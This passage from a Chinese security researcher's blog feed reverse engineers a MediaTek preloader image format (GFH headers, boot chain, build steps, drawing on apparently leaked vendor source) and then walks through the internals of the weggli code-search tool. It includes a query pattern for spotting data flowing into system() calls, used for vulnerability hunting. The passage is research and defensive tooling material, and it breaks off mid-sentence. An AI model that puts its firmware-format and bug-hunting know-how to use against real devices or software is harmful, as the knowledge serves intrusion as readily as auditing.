class="built_in">GFH_FILE_INFO_BasicCheck</span>(buf_addr);</span><br><span class="line">  <span class="keyword">if</span> ( ret &gt; <span class="number">0xFFF</span> )</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  cnt = *(_DWORD *)(buf_addr + <span class="number">0x28</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; cnt; i = v10 )               <span class="comment">// parse sub struct?</span></span><br><span class="line">  &#123;</span><br><span class="line">    st = buf_addr + i;</span><br><span class="line">    <span class="keyword">if</span> ( (*(_DWORD *)st &amp; <span class="number">0xFFFFFF</span>) != <span class="number">5066061</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0x1003</span>LL;</span><br><span class="line">    v10 = i + *(<span class="keyword">unsigned</span> __int16 *)(st + <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> ( cnt &lt; v10 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0x1005</span>LL;</span><br><span class="line">    <span class="keyword">if</span> ( v15_0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_WORD *)(st + <span class="number">6</span>) &lt;= <span class="number">0x104</span>u )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = flag_0 + <span class="number">24LL</span> * *(<span class="keyword">unsigned</span> __int16 *)(st + <span class="number">6</span>) + <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">if</span> ( *(_BYTE *)v8 )</span><br><span class="line">        &#123;</span><br><span class="line">          reta = (*(__int64 (__fastcall **)(__int64, _QWORD))(v8 + <span class="number">8</span>))(st, *(_QWORD *)(v8 + <span class="number">16</span>));</span><br><span class="line">          <span class="keyword">if</span> ( reta &gt; <span class="number">0xFFF</span> )</span><br><span class="line">            <span class="keyword">return</span> reta;</span><br><span class="line">          v14 = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( type == *(<span class="keyword">unsigned</span> __int16 *)(st + <span class="number">6</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *GFG_st = st;                             <span class="comment">// [1]</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v15_0 &amp;&amp; v14 )</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0x1003</span>LL;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>[1]</code> 的位置 找到这个结构，然后把指针赋值，分析这段逻辑，其实就是文件头:</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/preloader_hexview.png" alt="preloader_hexview"></p>
<p>指定preloader文件大小是 <code>0x26794</code>，修改文件大小即可。</p>
<h3 id="解决报错"><a href="#解决报错" class="headerlink" title="解决报错"></a>解决报错</h3><p>所以只需要修改 preloader文件的长度为其 <code>+0x24</code> 处 4bytes代表size的字段即可<br>PS：不能修改这个长度字段</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/load_preloader_img.png" alt="load_preloader_img"></p>
<h2 id="深入研究"><a href="#深入研究" class="headerlink" title="深入研究"></a>深入研究</h2><blockquote>
<p>之前搞的平台也没注意这个问题，也没报错，但是size对不上，所以需要探究文件格式和为什么检查</p>
</blockquote>
<h3 id="什么是preloader"><a href="#什么是preloader" class="headerlink" title="什么是preloader"></a>什么是preloader</h3><ul>
<li><a href="https://www.cnblogs.com/wen123456/p/14034493.html">MTK6735 pre-loader源代码分析 - luoyuna - 博客园</a></li>
<li><a href="https://blog.csdn.net/u011784994/article/details/104898430">[MT6765]Preloader_流程分析–基于android 10_nancy的专栏-CSDN博客_android pmic</a></li>
<li>还有leak的MT6577的基线代码参考</li>
</ul>
<p><code>介于boot rom 和 bootloader之间的桥梁</code>，主要工作是初始化环境，包括c环境，timer,gpio,pmic,uart,i2c等以及装载lk镜像至DRAM中,建立起最基本的运行环境,最重要的就是<strong>初始化DRAM</strong>。</p>
<ul>
<li>执行在 ARM  EL3</li>
</ul>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/preloader_birdview.png" alt="preloader_birdview"></p>
<h3 id="工作原理-–-启动过程"><a href="#工作原理-–-启动过程" class="headerlink" title="工作原理 – 启动过程"></a>工作原理 – 启动过程</h3><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/mtk_boot.png" alt="mtk_boot"></p>
<p>另一种情况是实现了ATF(Arm Trust Firmware)的时候：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/boot_with_atf.png" alt="boot_with_atf"></p>
<p><a href="https://blog.csdn.net/chenying126/article/details/78638944">ATF实现原理_chenying126的博客-CSDN博客_atf</a></p>
<ol>
<li>boot rom中执行boot code</li>
<li>把preloader加载到 ISRAM中</li>
<li>执行preloader，各种初始化的工作(DRAM初始化)</li>
<li>把bootloader(uboot, lk)加载到DRAM</li>
<li>跳转到lk执行</li>
<li>lk执行</li>
<li>把Linux kernel 和 ramdisk加载到DRAM</li>
<li>跳转到kernel</li>
<li>kernel执行</li>
<li>这是在Linux启动过程中使用的一个临时根 </li>
</ol>
<h3 id="preloader-解析"><a href="#preloader-解析" class="headerlink" title="preloader 解析"></a>preloader 解析</h3><p>preloader可以看成一个特定格式的可执行文件，所以需要找入口点。</p>
<p><code>/Users/muhe/Code/MTK6577/mediatek/platform/mt6577/preloader/src/init/init.s</code></p>
<p>github上找的一个可能是泄漏的基线代码来参考的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">_start :</span><br><span class="line"></span><br><span class="line">b resethandler</span><br><span class="line"></span><br><span class="line">bss_start:</span><br><span class="line"></span><br><span class="line">.word _bss_start</span><br><span class="line"></span><br><span class="line">bss_end:</span><br><span class="line"></span><br><span class="line">.word _bss_end</span><br><span class="line"></span><br><span class="line">stack :</span><br><span class="line"></span><br><span class="line">.long sys_stack</span><br><span class="line"></span><br><span class="line">stacksz:</span><br><span class="line"></span><br><span class="line">.long sys_stack_sz</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">resethandler :</span><br><span class="line">    MOV r0, #0</span><br><span class="line">    </span><br><span class="line">    MOV r1, #0</span><br><span class="line">    </span><br><span class="line">    MOV r2, #0</span><br><span class="line">    </span><br><span class="line">    MOV r3, #0</span><br><span class="line">    </span><br><span class="line">    MOV r4, #0</span><br><span class="line">    </span><br><span class="line">    MOV r5, #0</span><br><span class="line">    </span><br><span class="line">    MOV r6, #0</span><br><span class="line">    </span><br><span class="line">    MOV r7, #0</span><br><span class="line">    </span><br><span class="line">    MOV r8, #0</span><br><span class="line">    </span><br><span class="line">    MOV r9, #0</span><br><span class="line">    </span><br><span class="line">    MOV r10, #0</span><br><span class="line">    </span><br><span class="line">    MOV r11, #0</span><br><span class="line">    </span><br><span class="line">    MOV r12, #0</span><br><span class="line">    </span><br><span class="line">    MOV sp, #0</span><br><span class="line">    </span><br><span class="line">    MOV lr, #0</span><br></pre></td></tr></table></figure>

<p>这个特征还是很明显的，可以试试看:</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/preloader_init.png" alt="preloader_init"></p>
<p>上面这个0xEA应该是 b指令，可以借由这个搞定基地址</p>
<p>然后是到<code>main.c</code>，继续人肉找特征</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/preloader_main.png" alt="preloader_main"></p>
<p>找到了字符串，但是没有引用关系 :( </p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/preloader_main%201.png" alt="preloader_main 1"></p>
<p>通过Ghrida的强制整个binary的分析，然后引用关系确定了main的位置，至此就可以往下看了，对比其他平台preloader的源码，能看个七七八八了。</p>
<p>PS : 基地址编译的时候可以指定的，比如在 <code>linux/bootloader/preloader/platform/mt6735/link_descriptor.ld</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">OUTPUT_ARCH(arm)</span><br><span class="line"></span><br><span class="line">ENTRY(_start)</span><br><span class="line"></span><br><span class="line">romBase = <span class="number">0x00201000</span>;</span><br><span class="line">ramBase = <span class="number">0x00102180</span>;</span><br><span class="line"></span><br><span class="line">MEMORY &#123;</span><br><span class="line">    ram : ORIGIN = ramBase, LENGTH = <span class="number">0xBA80</span></span><br><span class="line">    rom : ORIGIN = romBase, LENGTH = <span class="number">0x1F000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还有 : <code>linux/bootloader/preloader/platform/mt6735/default.mak</code></p>
<p>github真是个好地方啊，还有一个完整的MT6737平台Linux based的基线代码，全套的环境和build产物都有的，可以看到：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/mt6737_preloader_bin_list.png" alt="mt6737_preloader_bin_list"></p>
<ul>
<li>推测preloader应该是一个elf 经过copyobj之类的处理之后拼接上了特定的文件头</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ file *.elf</span><br><span class="line">preloader_bd6737m_35g_b_m0.elf: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, with debug_info, not stripped</span><br></pre></td></tr></table></figure>


<p>查看相关的makefile可以验证该猜想:</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="variable">$(D_BIN)</span>/preloader.elf: <span class="variable">$(D_BIN)</span>/<span class="variable">$(PL_IMAGE_NAME)</span>.elf</span><br><span class="line"></span><br><span class="line">    <span class="variable">$(OBJCOPY)</span> -R .dram <span class="variable">$(D_BIN)</span>/<span class="variable">$(PL_IMAGE_NAME)</span>.elf -O elf32-littlearm <span class="variable">$(D_BIN)</span>/preloader.elf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">ifeq</span> (<span class="variable">$(CFG_PRELOADER_DRAM_USE)</span>, 1)</span><br><span class="line"></span><br><span class="line"><span class="section">preloader_bin: <span class="variable">$(D_BIN)</span>/<span class="variable">$(PL_DRAM_IMAGE_NAME)</span>.bin</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$(D_BIN)</span>/<span class="variable">$(PL_DRAM_IMAGE_NAME)</span>.bin: <span class="variable">$(D_BIN)</span>/<span class="variable">$(PL_IMAGE_NAME)</span>.elf</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$(hide)</span> <span class="variable">$(OBJCOPY)</span> $&#123;OBJCFLAGS&#125; <span class="variable">$(OBJSECOND_FLAG)</span> <span class="variable">$(D_BIN)</span>/<span class="variable">$(PL_IMAGE_NAME)</span>.elf -O binary <span class="variable">$(D_BIN)</span>/<span class="variable">$(PL_DRAM_IMAGE_NAME)</span>.bin</span><br></pre></td></tr></table></figure>


<p>遂尝试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PL_IMG_SECOND_PARTION_SECTION :=.pl_dram.text .pl_dram.data .pl_dram.rodata .pl_dram.start</span><br><span class="line">OBJSECOND_FLAG := $(addprefix -j , $(PL_IMG_SECOND_PARTION_SECTION))</span><br><span class="line"></span><br><span class="line">objcopy --gap-fill=0xff <span class="variable">$OBJSECOND_FLAG</span> input.elf -O binary output.bin</span><br></pre></td></tr></table></figure>

<p><code>addprefix</code>这个可以忽略</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/objcopy_test.png" alt="objcopy_test"></p>
<p>当然，hash想一样还是想多了，毕竟编译环境都不一样，直接上diff：</p>
<p>一共两处：<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/diff1.png" alt="diff1"></p>
<p>这个是多了一个GFH结构（说好的 NO_GFH 难道只是说头没有)</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/diff2.png" alt="diff2"></p>
<ul>
<li><p><code>preloader_bd6737m_35g_b_m0_LINKED.bin</code></p>
<ul>
<li> 比<code>output.bin</code> 多了一个GFH在尾部</li>
</ul>
</li>
<li><p><code>preloader_bd6737m_35g_b_m0_NO_GFH.bin</code></p>
<ul>
<li>中间与部分数据不一致</li>
<li> 比<code>output.bin</code> 多了一个GFH在尾部</li>
</ul>
</li>
<li><p><code>preloader_bd6737m_35g_b_m0.bin</code> 比 <code>preloader_bd6737m_35g_b_m0_NO_GFH.bin</code> 又多了一个GFH头和尾部的签名数据</p>
</li>
</ul>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/diff3.png" alt="diff3"></p>
<p>所以这里可以认定：</p>
<ul>
<li>preloader是一个elf，通过copyobj处理后，头、尾添加GFH相关的数据，得到MTK平台的preloader</li>
<li>然后MTK平台的preloader再添加EMMC BOOT头，就得到了从EMMC_BOOT_[1,2] 分区中得到的数据</li>
</ul>
<h4 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h4><p>这里以EMMC为例：</p>
<p><strong>EMMC_BOOT + GFH_INFO_EMMC + WTF1 + preloader_code + WTF2</strong></p>
<ul>
<li><p>EMMC_BOOT </p>
<ul>
<li> <code>MT6737/linux/bootloader/preloader/tools/gen-preloader-img.py</code></li>
</ul>
</li>
<li><p>GFH_INFO_EMMC :</p>
<ul>
<li><code>linux/bootloader/preloader/platform/mt6735/gfh/default/ns/GFH_INFO_EMMC.txt</code></li>
</ul>
</li>
<li><p>GFH Part 2 : GFH 的另一部分，还会修改上面的size</p>
<ul>
<li><code>linux/bootloader/preloader/tools/pbp/*</code></li>
</ul>
</li>
<li><p>preloader_code</p>
<ul>
<li><code>preloader.elf</code> objcopy处理之后</li>
</ul>
</li>
<li><p>WTF 2 : </p>
<ul>
<li>?</li>
</ul>
</li>
</ul>
<p>继续看Makefile来分析：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$(D_BIN)/$(PL_IMAGE_NAME).bin: $(D_BIN)/$(PL_IMAGE_NAME)_NO_GFH.bin $(GFH_INFO) $(GFH_HASH) $(PBP_TOOL)</span><br><span class="line"></span><br><span class="line">    @<span class="built_in">echo</span> <span class="string">&quot;[ Only for Non-Secure Chip ]&quot;</span></span><br><span class="line">    </span><br><span class="line">    @<span class="built_in">echo</span> <span class="string">&quot;============================================&quot;</span></span><br><span class="line">    </span><br><span class="line">    @<span class="built_in">echo</span> <span class="string">&quot;INI_GFH_GEN=NO&quot;</span></span><br><span class="line">    </span><br><span class="line">    @<span class="built_in">echo</span> <span class="string">&quot;[ Attach <span class="subst">$(MTK_PLATFORM)</span> GFH ]&quot;</span></span><br><span class="line">    </span><br><span class="line">    @<span class="built_in">echo</span> <span class="string">&quot;============================================&quot;</span></span><br><span class="line">    </span><br><span class="line">    @<span class="built_in">echo</span> <span class="string">&quot; : GFH_INFO - <span class="subst">$(GFH_INFO)</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    @<span class="built_in">echo</span> <span class="string">&quot; : GFH_HASH - <span class="subst">$(GFH_HASH)</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">    cp -f $(GFH_INFO) <span class="variable">$@</span></span><br><span class="line">    </span><br><span class="line">    @chmod 777 <span class="variable">$@</span></span><br><span class="line">    </span><br><span class="line">    cat $&lt; &gt;&gt; <span class="variable">$@</span></span><br><span class="line">    </span><br><span class="line">    cat $(GFH_HASH) &gt;&gt; <span class="variable">$@</span></span><br><span class="line">    </span><br><span class="line">    $(PBP_TOOL) <span class="variable">$@</span></span><br><span class="line">    </span><br><span class="line">    @<span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(PBP_TOOL)</span> pass !!!!&quot;</span></span><br><span class="line"></span><br><span class="line">// ...</span><br><span class="line"></span><br><span class="line">$(D_BIN)/$(PL_IMAGE_NAME).bin: $(D_BIN)/$(PL_IMAGE_NAME)_LINKED.bin</span><br><span class="line"></span><br><span class="line">    cp -f $&lt; <span class="variable">$@</span></span><br></pre></td></tr></table></figure>

<p>遂可以得到：</p>
<ul>
<li>EMMC_BOOT<ul>
<li>  <code>MT6737/linux/bootloader/preloader/tools/gen-preloader-img.py</code> 生成</li>
</ul>
</li>
<li>GFH_INFO_EMMC<ul>
<li>  <code>**linux/bootloader/preloader/platform/mt6735/gfh/default/ns/GFH_INFO_EMMC.txt**</code> 但是这个file size字段是0xffffffff，后续会处理</li>
</ul>
</li>
<li>WTF1 : GFH_HASH<ul>
<li>  GFH_HASH.txt // GFH部分会由PBP_TOOL再次处理</li>
</ul>
</li>
<li>preloader code<ul>
<li>  编译的elf经过objcopy处理之后的代码数据</li>
</ul>
</li>
<li>  WTF2 ：preloader extension</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p><a href="https://linux.codingbelief.com/zh/storage/flash_memory/emmc/emmc_modes.html">eMMC 工 作 模 式 · Linux Kernel Internals</a></p>
</li>
<li><p><a href="https://github.com/SoCXin/MT6737">https://github.com/SoCXin/MT6737</a></p>
</li>
<li><p><a href="https://github.com/Motorola-MT6737/android_device_motorola_mt6737-common">https://github.com/Motorola-MT6737/android_device_motorola_mt6737-common</a></p>
</li>
<li><p><a href="https://github.com/andr3jx/MTK6577.git">https://github.com/andr3jx/MTK6577.git</a></p>
</li>
<li><p><a href="https://www.cnblogs.com/wen123456/p/14034493.html">MTK6735 pre-loader源代码分析 - luoyuna - 博客园</a></p>
</li>
<li><p>[<a href="https://blog.csdn.net/u011784994/article/details/104898430">MT6765]Preloader_流程分析–基于android 10_nancy的专栏-CSDN博客_android pmic</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>MTK</tag>
        <tag>preloader</tag>
        <tag>boot</tag>
      </tags>
  </entry>
  <entry>
    <title>weggli debug</title>
    <url>/2022/07/24/weggli-debug/</url>
    <content><![CDATA[<h2 id="关于Weggli"><a href="#关于Weggli" class="headerlink" title="关于Weggli"></a>关于Weggli</h2><blockquote>
<p>AST Pattern Search</p>
</blockquote>
<p>核心是使用和 <code>tree-sitter</code> 库，然后搞了 <code>query-tree</code> 来在 <code>AST</code>上进行搜索，这只能说是匹配特定的代码片段，还达不到程序分析的那个级别，所以理论上只能过程内分析，而且没有上下文啥的 :D  直白点说的话，像是<code>AST</code>的正则表达式，不过某种意义上来说对于使用白盒方案快速召回一些漏洞也是一种借鉴吧。</p>
<span id="more"></span>

<p>当然我也用这个工具做了一些扩展，结合其他工具解决了一些问题，目前看来这个东西还是具有一定的可玩性的 :D </p>
<h2 id="Weggli如何工作"><a href="#Weggli如何工作" class="headerlink" title="Weggli如何工作"></a>Weggli如何工作</h2><blockquote>
<p>看代码，调试分析</p>
</blockquote>
<h3 id="idea配置"><a href="#idea配置" class="headerlink" title="idea配置"></a>idea配置</h3><p>安装<code>Rust</code>插件，调试的话，会默认再去安装<code>Native Debugging Support</code>，有了这俩东西就可以调试了</p>
<p>配置传递给weggli的参数的话跟在 <code>--</code> 后面即可 : </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run --package weggli --bin weggli --  <span class="string">&quot;&#123;<span class="variable">$func</span>(<span class="variable">$b</span>);system(<span class="variable">$b</span>);&#125;&quot;</span> -R <span class="string">&quot;func=printf$&quot;</span> /path/to/src</span><br></pre></td></tr></table></figure>



<h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><blockquote>
<p>只描述核心流程</p>
</blockquote>
<h4 id="query-tree-构建"><a href="#query-tree-构建" class="headerlink" title="query-tree 构建"></a>query-tree 构建</h4><p>参考 <a href="https://tree-sitter.github.io/tree-sitter/">tree-sitter文档</a></p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> work: <span class="built_in">Vec</span>&lt;WorkItem&gt; = args</span><br><span class="line">        .pattern</span><br><span class="line">        .iter()</span><br><span class="line">        .map(|pattern| &#123;</span><br><span class="line">            <span class="keyword">match</span> parse_search_pattern(pattern, args.cpp, args.force_query, &amp;regex_constraints) &#123;</span><br><span class="line">                <span class="literal">Ok</span>(qt) =&gt; &#123;</span><br><span class="line">                    <span class="keyword">let</span> identifiers = qt.identifiers();</span><br><span class="line">                    variables.extend(qt.variables());</span><br><span class="line">                    WorkItem &#123; qt, identifiers &#125;</span><br><span class="line">        <span class="comment">// ....</span></span><br></pre></td></tr></table></figure>

<p>构造 <code>WorkItem&#123;qt, identifiers&#125;</code></p>
<ul>
<li>qt : query-tree, tree-sitter的Tree对象</li>
<li>identifiers : 标识符，query中”终结符” </li>
</ul>
<p>调用链:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">main</span><br><span class="line">    parse_search_pattern</span><br><span class="line">        weggli::parse(pattern, is_cpp) // 返回Tree对象</span><br><span class="line">        //修正pattern</span><br><span class="line">        validate_query</span><br><span class="line">        build_query_tree</span><br></pre></td></tr></table></figure>



<blockquote>
<p> 修正pattern : weggli处理了“不合法的”格式，如:</p>
</blockquote>
<ul>
<li><code>memcpy(a,b,size)</code> -&gt; <code>memcpy(a,b,size);</code></li>
<li><code>memcpy(a,b,size);</code> -&gt; <code>&#123;memcpy(a,b,size);&#125;</code></li>
</ul>
<blockquote>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">validate_query(&amp;tree, p, force_query)? <span class="comment">// 返回 TreeCursor对象，用于遍历AST</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>语法合法性检查，如果 <code>force_query</code>为<code>True</code>，意味着忽略这些语法错误</p>
<p>如 : </p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220707154439731.png" alt="image-20220707154439731"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&#123;$func($b);_($b);&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>对应 : </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(translation_unit </span><br><span class="line">    (</span><br><span class="line">        compound_statement </span><br><span class="line">        (</span><br><span class="line">            expression_statement (call_expression function: (identifier) arguments: (argument_list (identifier)))</span><br><span class="line">        ) </span><br><span class="line">        (</span><br><span class="line">            expression_statement (call_expression function: (identifier) arguments: (argument_list (identifier)))</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>



<p>同时还不允许 : </p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220707155732813.png" alt="image-20220707155732813"></p>
<p>返回的是 : <code>c.goto_first_child();</code>，即 花括号中间的内容</p>
<blockquote>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="literal">Ok</span>(build_query_tree(</span><br><span class="line"> p,</span><br><span class="line"> &amp;<span class="keyword">mut</span> c,</span><br><span class="line"> is_cpp,</span><br><span class="line"> <span class="literal">Some</span>(regex_constraints.clone()),</span><br><span class="line">))</span><br><span class="line"></span><br><span class="line">_build_query_tree(source, cursor, <span class="number">0</span>, is_cpp, <span class="literal">false</span>, <span class="literal">false</span>, regex_constraints)</span><br></pre></td></tr></table></figure>
</blockquote>
<p>QueryTree数据结构:</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="class"><span class="keyword">struct</span> <span class="title">QueryTree</span></span> &#123;</span><br><span class="line">    query: Query,</span><br><span class="line">    captures: <span class="built_in">Vec</span>&lt;Capture&gt;,</span><br><span class="line">    negations: <span class="built_in">Vec</span>&lt;NegativeQuery&gt;,</span><br><span class="line">    variables: HashSet&lt;<span class="built_in">String</span>&gt;,</span><br><span class="line">    id: <span class="built_in">usize</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>转换的<code>tree_sitter query</code> (核心逻辑都在 <code>builder.rs</code> 的 <code>QueryBuilder.build</code>) </p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Translate the tree below `c` into a tree-sitter query string.</span><br><span class="line">&quot;&#123;$func($b);_($b);&#125;&quot;</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tree_sitter query 1: ((call_expression function:[(identifier) (field_expression) (field_identifier)] @0 arguments:(argument_list [(identifier) (field_expression) (field_identifier)] @1)) )([(identifier) (field_expression) (field_identifier)] @2 )</span><br><span class="line">tree_sitter query 0: (function_definition body: (compound_statement) @0) @1</span><br></pre></td></tr></table></figure>

<p>深度优先的方式递归生成query tree string，按照AST解析出来不同的节点，后面跟着的 <code>@x</code> 用来区分不同的 <code>identifier</code>，方便后面做匹配。</p>
<hr>
<p>如简单的 <code>&#123;printf(var, bar);&#125;</code> 生成的 <code>query-tree</code>是 : </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">((call_expression         </span><br><span class="line">        function:  [(field_expression field: (field_identifier)@0) (identifier) @0] </span><br><span class="line">        arguments: (argument_list </span><br><span class="line">                        . (identifier) @1 </span><br><span class="line">                        . (identifier) @2)</span><br><span class="line">                    ) </span><br><span class="line">                        </span><br><span class="line">                        (#eq? @0 &quot;printf&quot;)(#eq? @1 &quot;var&quot;)(#eq? @2 &quot;bar&quot;)) // captures</span><br></pre></td></tr></table></figure>

<p>结合tree-sitter的playground来看就很容易看明白了:</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/tree-sitter-playground.png" alt="tree-sitter-playground"></p>
<h4 id="query执行-pattern-匹配"><a href="#query执行-pattern-匹配" class="headerlink" title="query执行(pattern 匹配)"></a>query执行(pattern 匹配)</h4><p>在执行query之前会做</p>
<ul>
<li><p>对于需要正则匹配的 <code>identifer</code>做合法性确认</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> regex_constraints.variables() &#123;</span><br><span class="line">        <span class="keyword">if</span> !variables.contains(v) &#123;</span><br><span class="line">            eprintln!(<span class="string">&quot;&#x27;&#123;&#125;&#x27; is not a valid query variable&quot;</span>, v.red());</span><br><span class="line">            std::process::exit(<span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>确定待解析源码文件(<code>Verify that the --include and --exclude regexes are valid.</code>) 主要是根据后缀来</p>
</li>
</ul>
<p>随后就是通过管道来处理，分为：</p>
<ul>
<li>文件读取 &amp; AST解析 <code>let (ast_tx, ast_rx) = mpsc::channel();</code></li>
<li>QueryTree 匹配 &amp; 结果输出 <code>let (results_tx, results_rx) = mpsc::channel();</code></li>
</ul>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Spawn worker to iterate through files, parse potential matches and forward ASTs</span></span><br><span class="line">s.spawn(<span class="keyword">move</span> |_| parse_files_worker(files, ast_tx, w, cpp));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Run search queries on ASTs and apply CLI constraints</span></span><br><span class="line"><span class="comment">// on the results. For single query executions, we can</span></span><br><span class="line"><span class="comment">// directly print any remaining matches. For multi</span></span><br><span class="line"><span class="comment">// query runs we forward them to our next worker function</span></span><br><span class="line">s.spawn(<span class="keyword">move</span> |_| execute_queries_worker(ast_rx, results_tx, w, &amp;args));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> w.len() &gt; <span class="number">1</span> &#123;</span><br><span class="line">    s.spawn(<span class="keyword">move</span> |_| multi_query_worker(results_rx, w.len(), before, after));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**这玩意描述起来就像个流水线 :D **</p>
<p>详细描述的话就是：在有了 <code>query-tree</code>就需要把目标文件，解析(<code>parse_files_worker</code>)成 <code>(Tree, source_code)</code>，结果发送到 <code>ast_tx</code>，然后从<code>ast_rx</code>获取这些信息来执行查询操作(<code>execute_queries_worker</code>)；结果放在 <code>result_tx</code>，后面处理结果的函数会从<code>result_rx</code>获取，然后输出。</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">parse_files_worker(files, ast_tx, w, cpp);</span><br><span class="line">    weggli::parse(....);</span><br><span class="line">execute_queries_worker(ast_rx, results_tx, w, &amp;args); <span class="comment">// w  WorkItem，里面有query-tree</span></span><br><span class="line">    qt.matches(tree.root_node(), &amp;source);</span><br><span class="line">    match_internal(...);</span><br><span class="line">    QueryCursor.matches(...);</span><br><span class="line">    QueryTree.process_match(...);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>TODO: 需要细读逻辑</p>
</blockquote>
<p>这里简单的加一句print之类的可以来看看每次query的时候目标tree是啥样的(生成过程和query tree类似)</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Run query</span></span><br><span class="line"><span class="keyword">let</span> tmp_tree = tree.root_node().to_sexp();</span><br><span class="line"><span class="keyword">let</span> matches = qt.matches(tree.root_node(), &amp;source);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220801202121736.png" alt="image-20220801202121736"></p>
<p>所以这就转换成了一个字符串匹配的问题，结合之前的 <code>-R</code> ，能支持正则匹配，<strong>所以说weggli是在AST上搞正则匹配一点都没说错 :D</strong></p>
<h4 id="multi-query-p-参数"><a href="#multi-query-p-参数" class="headerlink" title="multi-query(-p 参数)"></a>multi-query(<code>-p</code> 参数)</h4><h5 id="漏洞模型测试"><a href="#漏洞模型测试" class="headerlink" title="漏洞模型测试"></a>漏洞模型测试</h5><p><a href="https://github.com/googleprojectzero/weggli/issues/21">Question - query construction </a> 这个issue里提到了这个场景，先还原一下场景 : </p>
<p><code>vuln.c</code> 是个类似的情况，尝试query</p>
